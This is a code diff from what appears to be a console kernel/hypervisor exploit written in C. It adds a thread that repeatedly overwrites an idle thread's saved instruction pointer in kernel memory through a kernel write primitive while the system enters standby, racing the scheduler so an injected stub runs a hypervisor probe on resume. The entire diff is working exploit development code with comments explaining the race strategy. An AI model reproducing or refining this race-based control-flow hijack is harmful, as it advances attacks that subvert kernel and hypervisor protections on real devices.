@@ -22,6 +22,7 @@
 #include <string.h>
 #include <unistd.h>
 #include <stdint.h>
+#include <pthread.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 
@@ -43,6 +44,28 @@ int sceSystemStateMgrEnterStandby(void);
 
 static uint64_t kdata_base_addr = 0;
 static uint32_t fw_version = 0;
+
+/* pcb_rip hammer thread: continuously overwrites pcb_rip with stub_addr
+ * via kekcall_copyin while the main thread calls sceSystemStateMgrEnterStandby.
+ * Each kekcall goes through the syscall mechanism (natural CPU yield). */
+typedef struct {
+    uint64_t stub_addr;
+    uint64_t pcb_rip_addr;
+    volatile int stop;
+    volatile int started;
+    volatile uint64_t writes;
+} hammer_args_t;
+
+static void* pcb_rip_hammer_thread(void* arg)
+{
+    hammer_args_t* ha = (hammer_args_t*)arg;
+    ha->started = 1;
+    while (!ha->stop) {
+        kekcall_copyin(&ha->stub_addr, ha->pcb_rip_addr, 8);
+        ha->writes++;
+    }
+    return NULL;
+}
 
 static void _kldload(void* data, size_t data_size)
 {
@@ -1788,13 +1811,18 @@ static void _kldload(void* data, size_t data_size)
              *
              * v4: The kernel thread no longer runs a persistence loop (that
              * caused kernel panics by monopolizing a CPU core). Instead, we
-             * hammer pcb_rip from userspace via kekcall_copyin with usleep
-             * between writes. This naturally yields the CPU.
+             * hammer pcb_rip from userspace via kekcall_copyin.
              *
-             * Strategy:
-             * 1. Hammer pcb_rip from userspace for 3 seconds (gate=0, safe)
-             * 2. Set gate=1 (enable hv_probe)
-             * 3. Final pcb_rip overwrite + immediate standby
+             * Strategy: use a dedicated pthread that hammers pcb_rip in a
+             * tight kekcall loop (no sleep), while the main thread calls
+             * sceSystemStateMgrEnterStandby(). The hammer thread keeps
+             * pcb_rip = stub_addr throughout the entire suspend sequence
+             * until the CPU halts.
+             *
+             * The kekcall_copyin goes through the syscall mechanism, so
+             * each write naturally yields to the kernel. This avoids the
+             * kernel-side tight loop that caused panics, while still being
+             * fast enough to win the race against cpu_switch.
              */
             if (phase == 1) {
                 uint64_t idle_pcb = readback[6];
@@ -1803,35 +1831,62 @@ static void _kldload(void* data, size_t data_size)
                 uint64_t pcb_rip_addr = idle_pcb + 0x38; /* PCB_RIP offset */
                 uint64_t gate_addr = kdata_base_val + 0x460;
 
-                printf("\n  >>> Hammering pcb_rip from userspace for 3 seconds... <<<\n");
+                static hammer_args_t hammer_args;
+                hammer_args.stub_addr = stub_addr_val;
+                hammer_args.pcb_rip_addr = pcb_rip_addr;
+                hammer_args.stop = 0;
+                hammer_args.started = 0;
+                hammer_args.writes = 0;
+
+                printf("\n  >>> Starting pcb_rip hammer thread... <<<\n");
                 printf("  >>> idle_pcb=%#lx stub=%#lx pcb_rip@=%#lx <<<\n",
                        idle_pcb, stub_addr_val, pcb_rip_addr);
                 fflush(stdout);
 
-                /* Hammer pcb_rip for ~3 seconds (gate=0: stub is safe nop).
-                 * usleep(500) = 0.5ms between writes → ~6000 writes over 3s.
-                 * Each kekcall_copyin goes through syscall, naturally yields CPU. */
-                for (int arm_i = 0; arm_i < 6000; arm_i++) {
+                pthread_t hammer_tid;
+                int pret = pthread_create(&hammer_tid, NULL,
+                                          pcb_rip_hammer_thread,
+                                          &hammer_args);
+
+                if (pret != 0) {
+                    printf("  >>> pthread_create failed (%d), falling back to inline loop <<<\n", pret);
+                    fflush(stdout);
+                    /* Fallback: inline loop for 3 seconds */
+                    for (int arm_i = 0; arm_i < 100000; arm_i++)
+                        kekcall_copyin(&stub_addr_val, pcb_rip_addr, 8);
+                    uint64_t gate_val = 1;
+                    kekcall_copyin(&gate_val, gate_addr, 8);
                     kekcall_copyin(&stub_addr_val, pcb_rip_addr, 8);
-                    usleep(500);
-                }
+                    sceSystemStateMgrEnterStandby();
+                } else {
+                    /* Wait for hammer thread to start */
+                    while (!hammer_args.started)
+                        usleep(100);
 
-                /* Set gate=1: from this point, if idle thread executes stub,
-                 * hv_probe will run. Keep the window short. */
-                printf("  >>> Setting gate=1 + final pcb_rip overwrite + standby <<<\n");
-                fflush(stdout);
+                    /* Let hammer run for 1 second (gate=0: stub is safe nop) */
+                    sleep(1);
+                    printf("  >>> Hammer running (%lu writes/sec) <<<\n",
+                           hammer_args.writes);
+                    fflush(stdout);
 
-                uint64_t gate_val = 1;
-                kekcall_copyin(&gate_val, gate_addr, 8);
+                    /* Set gate=1: on resume, stub will run hv_probe */
+                    uint64_t gate_val = 1;
+                    kekcall_copyin(&gate_val, gate_addr, 8);
 
-                /* Final pcb_rip overwrite, immediately followed by standby */
-                kekcall_copyin(&stub_addr_val, pcb_rip_addr, 8);
+                    printf("  >>> Gate=1 set. Entering standby (hammer still running)... <<<\n");
+                    fflush(stdout);
 
-                int sret = sceSystemStateMgrEnterStandby();
-                printf("  >>> sceSystemStateMgrEnterStandby() returned %d <<<\n", sret);
-                if (sret != 0) {
-                    printf("  >>> AUTO-STANDBY FAILED (ret=%d). Enter rest mode MANUALLY! <<<\n", sret);
-                    printf("  >>> pcb_rip will revert — overwrite was lost <<<\n");
+                    /* Call standby while hammer keeps pcb_rip armed.
+                     * The hammer thread runs through the entire suspend
+                     * sequence until the CPU halts. On resume, it won't
+                     * be running (process state is gone after re-exploit). */
+                    int sret = sceSystemStateMgrEnterStandby();
+                    printf("  >>> sceSystemStateMgrEnterStandby() returned %d <<<\n", sret);
+                    hammer_args.stop = 1;
+                    if (sret != 0) {
+                        printf("  >>> AUTO-STANDBY FAILED (ret=%d). <<<\n", sret);
+                    }
+                    pthread_join(hammer_tid, NULL);
                 }
                 fflush(stdout);
             }
